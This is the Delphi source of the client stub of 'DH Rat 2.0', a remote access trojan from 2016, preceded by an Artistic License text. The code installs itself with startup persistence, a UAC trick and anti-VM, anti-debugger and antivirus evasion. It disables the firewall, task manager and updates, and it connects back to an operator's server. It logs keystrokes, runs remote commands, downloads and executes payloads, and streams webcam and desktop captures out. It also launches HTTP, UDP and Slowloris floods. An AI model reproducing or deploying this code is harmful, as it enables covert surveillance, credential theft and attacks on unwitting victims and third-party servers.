{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// DH Rat 2.0
// (C) Doddy Hackman 2016

unit stub;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, DH_Builder_Tools,
  DH_Auxiliar_Tools, DH_Installer, DH_Malware_Functions, DH_Malware_Disables,
  DH_Malware_Antis, System.Win.ScktComp, IdCoder,
  IdCoderMIME, DH_TinyKeylogger, DH_DoS, DH_Snapshot, DH_Informator,
  Vcl.ExtCtrls;

type
  TFormHome = class(TForm)
    mmOutput: TMemo;
    csServer: TClientSocket;
    tmRemoteCapture: TTimer;
    csRemoteServer: TClientSocket;
    csRemoteCapture: TClientSocket;
    procedure FormCreate(Sender: TObject);
    procedure csServerRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure tmRemoteCaptureTimer(Sender: TObject);
    procedure csServerConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
  public
    { Public declarations }
    ip: string;
    port_server, port_remotecapture: string;
    timeout: string;
    timeout_converted: integer;
    desktop_online: boolean;
    webcam_online: boolean;
    procedure start_capture(option: string);
  end;

var
  FormHome: TFormHome;

implementation

{$R *.dfm}
// Functions

function base64_encode(text: string): string;
var
  Encoder: TIdEncoderMime;
begin
  Encoder := TIdEncoderMime.Create(nil);
  try
    Result := Encoder.EncodeString(text);
  finally
    FreeAndNil(Encoder);
  end
end;

function base64_decode(text: string): string;
var
  Decoder: TIdDecoderMime;
begin
  Decoder := TIdDecoderMime.Create(nil);
  try
    Result := Decoder.DecodeString(text);
  finally
    FreeAndNil(Decoder);
  end
end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function get_username(): string;
var
  username: string;
begin
  username := GetEnvironmentVariable('USERNAME');
  if not(username = '') then
  begin
    Result := username;
  end
  else
  begin
    Result := 'Error';
  end;
end;

function get_computer_name(): string;
var
  name: string;
begin
  name := GetEnvironmentVariable('COMPUTERNAME');
  if not(name = '') then
  begin
    Result := name;
  end
  else
  begin
    Result := 'Error';
  end;
end;

// More Functions

procedure TFormHome.start_capture(option: string);
var
  webcam_snapshot: T_DH_Snapshot;
  status, webcam_name: string;
  timeout_captureserver: string;
begin
  timeout_captureserver := '6';
  try
    begin

      timeout_converted := StrToInt(timeout_captureserver) * 1000;

      csRemoteServer.ClientType := ctBlocking;
      csRemoteCapture.ClientType := ctBlocking;

      csRemoteServer.Address := ip;
      csRemoteServer.Port := StrToInt(port_server);

      csRemoteCapture.Address := ip;
      csRemoteCapture.Port := StrToInt(port_remotecapture);

      csRemoteServer.Open;

      if (csRemoteServer.active) then
      begin

        mmOutput.Lines.Add('el servidor 1 esta activo');

        webcam_snapshot := T_DH_Snapshot.Create();

        webcam_name := webcam_snapshot.get_webcam_name();

        if (option = 'webcam') and (webcam_name = '?') then
        begin
          status := 'FAIL';
        end
        else
        begin
          status := 'READY';
        end;

        csRemoteServer.Socket.SendText('!CMD User : ' + get_username());
        Sleep(500);
        csRemoteServer.Socket.SendText('!CMD Webcam : ' + webcam_name);
        Sleep(500);
        csRemoteServer.Socket.SendText('!CMD Status : ' + status);
        Sleep(500);

        webcam_snapshot.Free();

        if (option = 'desktop') then
        begin
          desktop_online := True;
          webcam_online := False;
        end;

        if (option = 'webcam') then
        begin
          webcam_online := True;
          desktop_online := False;
        end;

        if (status = 'READY') then
        begin
          tmRemoteCapture.Interval := timeout_converted;
          tmRemoteCapture.Enabled := True;
        end;

      end
      else
      begin
        mmOutput.Lines.Add('el servidor 1 no esta activo en puerto ' +
          port_remotecapture);
      end;
    end;
  except
    on E: Exception do
    begin
      mmOutput.Lines.Add('No se puedo conectar al servidor ' + ip +
        ' en puerto ' + port_remotecapture);
      mmOutput.Lines.Add(E.ClassName + '-' + E.Message);
    end;
  end;
end;

procedure TFormHome.tmRemoteCaptureTimer(Sender: TObject);
var
  archivo: string;
  envio: TFileStream;
  dir: string;
  snapshot: T_DH_Snapshot;
  auxiliar_tools: T_DH_Auxiliar_Tools;
begin
  mmOutput.Lines.Add('timer1 activo');
  auxiliar_tools := T_DH_Auxiliar_Tools.Create();
  try
    begin
      if (csRemoteServer.active) then
      begin

        snapshot := T_DH_Snapshot.Create();

        archivo := 'screenshot.jpg';

        if (desktop_online = True) then
        begin
          if (snapshot.take_screenshot_desktop(archivo, True)) then
          begin
            mmOutput.Lines.Add('Photo Taked');
          end;
        end;

        if (webcam_online = True) then
        begin
          if (snapshot.take_photo_webcam(archivo, True)) then
          begin
            mmOutput.Lines.Add('Photo Taked');
          end;
        end;

        auxiliar_tools.hide_file(archivo);

        snapshot.Free();

        envio := TFileStream.Create(archivo, fmOpenRead or fmShareDenyWrite);

        mmOutput.Lines.Add('enviando datos al servidor 1');

        csRemoteServer.Socket.SendText('!FILENAME' + ExtractFileName(archivo));
        csRemoteServer.Socket.SendText('!FILESIZE' + IntToStr(envio.Size));

        mmOutput.Lines.Add('conectando al servidor 2');

        csRemoteCapture.Open;

        if (csRemoteCapture.active) then
        begin
          if csRemoteCapture.Socket.SendStream(envio) then
          begin
            envio := nil;
            mmOutput.Lines.Add('Archivo enviado');
          end
          else
          begin
            mmOutput.Lines.Add('No se envio archivo');
          end;
          DeleteFile('screenshot.jpg');
          csRemoteCapture.Close;
        end
        else
        begin
          mmOutput.Lines.Add('no se conecto al servidor 2');
        end;

        envio := nil;
        envio.Free;
      end
      else
      begin
        mmOutput.Lines.Add('no esta conectado al servidor 1');
      end;
    end;
  except
    begin
      //
    end;
  end;
  auxiliar_tools.Free();
end;

//

procedure TFormHome.csServerConnect(Sender: TObject; Socket: TCustomWinSocket);
var
  info: T_DH_Informator;
  read_code: string;
  my_ip, my_username, my_country, my_country_image, my_os: string;
begin

  {
    my_ip := '187.45.12.1';
    my_country := 'Brasil';
    my_country_image := 'link';
    my_username := 'Doddy';
    my_os := 'Windows 7';
  }

  info := T_DH_Informator.Create();

  read_code := info.get_ip_and_country();

  my_ip := regex(read_code, '[ip]', '[ip]');
  if (my_ip = '') then
  begin
    my_ip := info.get_my_ip();
  end;
  if (my_ip = '') then
  begin
    my_ip := '?';
  end;
  my_country := regex(read_code, '[country]', '[country]');
  if (my_country = '') then
  begin
    my_country := info.get_my_country();
  end;
  if (my_country = '') then
  begin
    my_country := '?';
  end;
  my_country_image := regex(read_code, '[link_flag]', '[link_flag]');

  my_username := info.get_username();
  my_os := info.get_os();

  csServer.Socket.SendText('![noob_register][ip]' + my_ip + '[ip][country]' +
    my_country + '[country][country_image]' + my_country_image +
    '[country_image][username]' + my_username + '[username][os]' + my_os
    + '[os]');

  info.Free();

end;

procedure TFormHome.csServerRead(Sender: TObject; Socket: TCustomWinSocket);
var
  code: string;
  mark: string;
  argument1: string;
  argument2: string;
  argument3: string;
  auxiliar_tools: T_DH_Auxiliar_Tools;
  malware_functions: T_DH_Malware_Functions;
  malware_disables: T_DH_Malware_Disables;
  dos: T_DH_DoS;
var
  add_ip, add_port: string;
begin

  code := base64_decode(Socket.ReceiveText);

  mmOutput.Lines.Add('Command : ' + code);

  auxiliar_tools := T_DH_Auxiliar_Tools.Create();
  malware_functions := T_DH_Malware_Functions.Create();
  malware_disables := T_DH_Malware_Disables.Create();
  dos := T_DH_DoS.Create();

  argument1 := regex(code, '[argument1]', '[argument1]');
  argument2 := regex(code, '[argument2]', '[argument2]');
  argument3 := regex(code, '[argument3]', '[argument3]');

  mark := '![noob_response]';

  // Commands

  if (Pos('![list_directory]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.list_directory
      (argument1));
  end;

  if (Pos('![read_file]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.read_file(argument1));
  end;

  if (Pos('![delete_file]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.delete_filename
      (argument1));
  end;

  if (Pos('![list_process]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.list_process());
  end;

  if (Pos('![kill_process]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.kill_process(argument1));
  end;

  if (Pos('![execute_command]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.execute_command
      (argument1));
  end;

  if (Pos('![enable_regedit]', code) > 0) then
  begin
    if (malware_disables.regedit_manager('on')) then
    begin
      csServer.Socket.SendText(mark + '[+] Regedit On : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[+] Regedit On : FAIL');
    end;
  end;

  if (Pos('![disable_regedit]', code) > 0) then
  begin
    if (malware_disables.regedit_manager('off')) then
    begin
      csServer.Socket.SendText(mark + '[+] Regedit Off : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[+] Regedit Off : FAIL');
    end;
  end;

  if (Pos('![enable_firewall]', code) > 0) then
  begin
    if (malware_disables.firewall_manager('seven', 'on')) then
    begin
      csServer.Socket.SendText(mark + '[+] Firewall On : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[+] Firewall On : FAIL');
    end;
  end;

  if (Pos('![disable_firewall]', code) > 0) then
  begin
    if (malware_disables.firewall_manager('seven', 'off')) then
    begin
      csServer.Socket.SendText(mark + '[+] Firewall Off : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[+] Firewall Off : FAIL');
    end;
  end;

  if (Pos('![open_cd]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.cd_manager('open'));
  end;

  if (Pos('![close_cd]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.cd_manager('close'));
  end;

  if (Pos('![enable_icons]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.icons_manager('show'));
  end;

  if (Pos('![disable_icons]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.icons_manager('hide'));
  end;

  if (Pos('![enable_taskbar]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.taskbar_manager('show'));
  end;

  if (Pos('![disable_taskbar]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.taskbar_manager('hide'));
  end;

  if (Pos('![message_single]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.message_box(argument1,
      argument2, 'Information'));
  end;

  if (Pos('![message_bomber]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.message_box_bomber
      (argument1, argument2, 'Information', StrToInt(argument3)));
  end;

  if (Pos('![sendkeys]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.SendKeys(argument1));
  end;

  if (Pos('![sendkeys_word]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.write_word(argument1));
  end;

  if (Pos('![crazy_mouse]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.crazy_mouse
      (StrToInt(argument1)));
  end;

  if (Pos('![crazy_hour]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.crazy_hour
      (StrToInt(argument1)));
  end;

  if (Pos('![shutdown]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.shutdown());
  end;

  if (Pos('![reboot]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.reboot());
  end;

  if (Pos('![close_session]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.close_session());
  end;

  if (Pos('![open_url]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.load_page(argument1));
  end;

  if (Pos('![load_paint]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.load_paint());
  end;

  if (Pos('![open_url]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.load_page(argument1));
  end;

  if (Pos('![change_taskbar_text_enable]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.edit_taskbar_text('on',
      argument1));
  end;

  if (Pos('![change_taskbar_text_disable]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.edit_taskbar_text
      ('off', 'hi'));
  end;

  if (Pos('![turn_off_monitor]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.turn_off_monitor());
  end;

  if (Pos('![speak]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.speak(argument1));
  end;

  if (Pos('![play_beeps]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.play_beep
      (StrToInt(argument1)));
  end;

  if (Pos('![list_drives]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.get_drives());
  end;

  if (Pos('![list_services]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.get_services());
  end;

  if (Pos('![list_windows]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.list_windows());
  end;

  if (Pos('![download_and_execute]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.download_and_execute
      (argument1, argument2));
  end;

  if (Pos('![download_and_change_wallpaper]', code) > 0) then
  begin
    csServer.Socket.SendText
      (mark + malware_functions.download_and_change_wallpaper(argument1));
  end;

  if (Pos('![download_and_change_screensaver]', code) > 0) then
  begin
    csServer.Socket.SendText
      (mark + malware_functions.download_and_change_screensaver(argument1));
  end;

  if (Pos('![printer_bomber]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.printer_bomber(argument1,
      StrToInt(argument2)));
  end;

  if (Pos('![form_bomber]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.form_bomber(argument1,
      argument2, '', '', 0, 0, StrToInt(argument3)));
  end;

  if (Pos('![html_bomber]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.html_bomber(argument1,
      argument2, '', StrToInt(argument3)));
  end;

  if (Pos('![windows_bomber]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.windows_bomber
      (StrToInt(argument1)));
  end;

  if (Pos('![block_all]', code) > 0) then
  begin
    csServer.Socket.SendText(mark + malware_functions.block_all('on'));
  end;

  if (Pos('![ddos_sqli_dos]', code) > 0) then
  begin
    if (dos.SQLI_DOS(argument1, StrToInt(argument2))) then
    begin
      csServer.Socket.SendText(mark + '[+] SQLI Flood : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[-] SQLI Flood : FAIL');
    end;
  end;

  if (Pos('![ddos_http_flood]', code) > 0) then
  begin
    if (dos.HTTP_Flood(argument1, StrToInt(argument2))) then
    begin
      csServer.Socket.SendText(mark + '[+] HTTP Flood : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[-] HTTP Flood : FAIL');
    end;
  end;

  if (Pos('![ddos_socket_dos]', code) > 0) then
  begin
    add_ip := regex(argument1, '[ddos_socket_flood_ip]',
      '[ddos_socket_flood_ip]');
    add_port := regex(argument1, '[ddos_socket_flood_port]',
      '[ddos_socket_flood_port]');
    if (dos.Socket_Flood(add_ip, StrToInt(add_port), argument2,
      StrToInt(argument3))) then
    begin
      csServer.Socket.SendText(mark + '[+] Socket Flood : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[-] Socket Flood : FAIL');
    end;
  end;

  if (Pos('![ddos_slowloris]', code) > 0) then
  begin
    if (dos.Slowloris(argument1, StrToInt(argument2))) then
    begin
      csServer.Socket.SendText(mark + '[+] Slowloris : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[-] Slowloris : FAIL');
    end;
  end;

  if (Pos('![ddos_udp_flood]', code) > 0) then
  begin
    if (dos.UDP_DoS(argument1, StrToInt(argument2), StrToInt(argument3))) then
    begin
      csServer.Socket.SendText(mark + '[+] UDP Flood : OK');
    end
    else
    begin
      csServer.Socket.SendText(mark + '[-] UDP Flood : FAIL');
    end;
  end;

  if (Pos('![keylogger_logs]', code) > 0) then
  begin
    if (FileExists('logs.html')) then
    begin
      csServer.Socket.SendText('![keylogger_logs]<br>' +
        malware_functions.read_file('logs.html'));
    end
    else
    begin
      csServer.Socket.SendText(mark + '[-] Keylogger Logs : FAIL');
    end;
  end;

  if (Pos('![uninstaller]', code) > 0) then
  begin
    if (auxiliar_tools.delete_startup('dhr')) then
    begin
      csServer.Socket.SendText('[+] Uninstaller : OK');
      ExitProcess(0);
    end
    else
    begin
      csServer.Socket.SendText('[-] Uninstaller : FAIL');
    end;
  end;

  if (Pos('![start_desktop_capture]', code) > 0) then
  begin
    start_capture('desktop');
    csServer.Socket.SendText(mark + '[+] Desktop Capture On : OK');
  end;

  if (Pos('![stop_desktop_capture]', code) > 0) then
  begin
    tmRemoteCapture.Enabled := False;
    csRemoteCapture.Close;
    csServer.Socket.SendText(mark + '[+] Desktop Capture Off : OK');
  end;

  if (Pos('![start_webcam_capture]', code) > 0) then
  begin
    start_capture('webcam');
    csServer.Socket.SendText(mark + '[+] Webcam Capture On : OK');
  end;

  if (Pos('![stop_webcam_capture]', code) > 0) then
  begin
    tmRemoteCapture.Enabled := False;
    csRemoteCapture.Close;
    csServer.Socket.SendText(mark + '[+] Webcam Capture Off : OK');
  end;

  // End Of Commands

  auxiliar_tools.Free();
  malware_functions.Free();
  malware_disables.Free();
  dos.Free();

end;

procedure TFormHome.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if (FileExists('screenshot.jpg')) then
  begin
    DeleteFile('screenshot.jpg');
  end;
end;

procedure TFormHome.FormCreate(Sender: TObject);
var
  logs: string;
var
  contenido: string;
  builder_tools: T_DH_Builder_Tools;
  installer: T_DH_Installer;
  keylogger: T_DH_TinyKeylogger;
  active: string;
var
  op_hide_files, op_use_startup, op_keylogger, op_use_special_path,
    op_use_this_path, op_use_uac_tricky, op_uac_tricky_continue_if_off,
    op_uac_tricky_exit_if_off, op_use_this_datetime, creation_time,
    modified_time, last_access, special_path, path, folder, op_anti_virtual_pc,
    op_anti_virtual_box, op_anti_debug, op_anti_wireshark, op_anti_ollydbg,
    op_anti_anubis, op_anti_kaspersky, op_anti_vmware, op_disable_uac,
    op_disable_firewall, op_disable_cmd, op_disable_run, op_disable_taskmgr,
    op_disable_regedit, op_disable_updates, op_disable_msconfig: string;
var
  tipo: string;
  status: string;
begin
  tipo := 'desktop';

  builder_tools := T_DH_Builder_Tools.Create();

  contenido := builder_tools.read_resource(666);

  if not(contenido = '') then
  begin

    active := regex(contenido, '[active]', '[active]');

    ip := regex(contenido, '[ip]', '[ip]');
    port_server := regex(contenido, '[port_server]', '[port_server]');
    port_remotecapture := regex(contenido, '[port_remotecapture]',
      '[port_remotecapture]');
    timeout := regex(contenido, '[timeout]', '[timeout]');

    op_hide_files := regex(contenido, '[op_hide_files]', '[op_hide_files]');
    op_use_startup := regex(contenido, '[op_use_startup]', '[op_use_startup]');
    op_keylogger := regex(contenido, '[op_keylogger]', '[op_keylogger]');
    op_use_special_path := regex(contenido, '[op_use_special_path]',
      '[op_use_special_path]');
    op_use_this_path := regex(contenido, '[op_use_this_path]',
      '[op_use_this_path]');
    special_path := regex(contenido, '[special_path]', '[special_path]');
    path := regex(contenido, '[path]', '[path]');
    folder := regex(contenido, '[folder]', '[folder]');

    op_use_uac_tricky := regex(contenido, '[op_use_uac_tricky]',
      '[op_use_uac_tricky]');
    op_uac_tricky_continue_if_off :=
      regex(contenido, '[op_uac_tricky_continue_if_off]',
      '[op_uac_tricky_continue_if_off]');
    op_uac_tricky_exit_if_off := regex(contenido, '[op_uac_tricky_exit_if_off]',
      '[op_uac_tricky_exit_if_off]');

    op_use_this_datetime := regex(contenido, '[op_use_this_datetime]',
      '[op_use_this_datetime]');
    creation_time := regex(contenido, '[creation_time]', '[creation_time]');
    modified_time := regex(contenido, '[modified_time]', '[modified_time]');
    last_access := regex(contenido, '[last_access]', '[last_access]');

    op_anti_virtual_pc := regex(contenido, '[op_anti_virtual_pc]',
      '[op_anti_virtual_pc]');
    op_anti_virtual_box := regex(contenido, '[op_anti_virtual_box]',
      '[op_anti_virtual_box]');
    op_anti_debug := regex(contenido, '[op_anti_debug]', '[op_anti_debug]');
    op_anti_wireshark := regex(contenido, '[op_anti_wireshark]',
      '[op_anti_wireshark]');
    op_anti_ollydbg := regex(contenido, '[op_anti_ollydbg]',
      '[op_anti_ollydbg]');
    op_anti_anubis := regex(contenido, '[op_anti_anubis]', '[op_anti_anubis]');
    op_anti_kaspersky := regex(contenido, '[op_anti_kaspersky]',
      '[op_anti_kaspersky]');
    op_anti_vmware := regex(contenido, '[op_anti_vmware]', '[op_anti_vmware]');

    op_disable_uac := regex(contenido, '[op_disable_uac]', '[op_disable_uac]');
    op_disable_firewall := regex(contenido, '[op_disable_firewall]',
      '[op_disable_firewall]');
    op_disable_cmd := regex(contenido, '[op_disable_cmd]', '[op_disable_cmd]');
    op_disable_run := regex(contenido, '[op_disable_run]', '[op_disable_run]');
    op_disable_taskmgr := regex(contenido, '[op_disable_taskmgr]',
      '[op_disable_taskmgr]');
    op_disable_regedit := regex(contenido, '[op_disable_regedit]',
      '[op_disable_regedit]');
    op_disable_updates := regex(contenido, '[op_disable_updates]',
      '[op_disable_updates]');
    op_disable_msconfig := regex(contenido, '[op_disable_msconfig]',
      '[op_disable_msconfig]');

    if (active = '1') then
    begin

      installer := T_DH_Installer.Create();

      installer.set_UAC_Tricky(op_use_uac_tricky, op_uac_tricky_continue_if_off,
        op_uac_tricky_exit_if_off, '1');
      installer.setAntis(op_anti_virtual_pc, op_anti_virtual_box, op_anti_debug,
        op_anti_wireshark, op_anti_ollydbg, op_anti_anubis, op_anti_kaspersky,
        op_anti_vmware);
      installer.setDisables(op_disable_uac, op_disable_firewall, op_disable_cmd,
        op_disable_run, op_disable_taskmgr, op_disable_regedit,
        op_disable_updates, op_disable_msconfig);
      installer.setMoveFile(op_use_special_path, op_use_this_path, special_path,
        path, folder, 'dhr.exe');
      installer.setHide(op_hide_files);
      installer.setStartup(op_use_startup, 'dhr');
      installer.setDateTime(op_use_this_datetime, creation_time, modified_time,
        last_access);

      logs := installer.Install();

      installer.Free();

      try
        begin

          csServer.Address := ip;
          csServer.Port := StrToInt(port_server);
          csServer.OnRead := csServerRead;
          csServer.Open;

          if (op_keylogger = '1') then
          begin
            keylogger := T_DH_TinyKeylogger.Create();
            keylogger.directory := GetCurrentDir;
            keylogger.logs_name := 'logs.html';
            keylogger.LoadVars;
            keylogger.start_keylogger_keys;
            keylogger.start_keylogger_windows;
          end;

          mmOutput.Lines.Add('Online');

        end
      except
        begin
          //
        end;
      end;

      builder_tools.Free();
    end;

  end
  else
  begin
    mmOutput.Lines.Add('OffLine');
    ExitProcess(0);
  end;
end;

end.

// The End ?
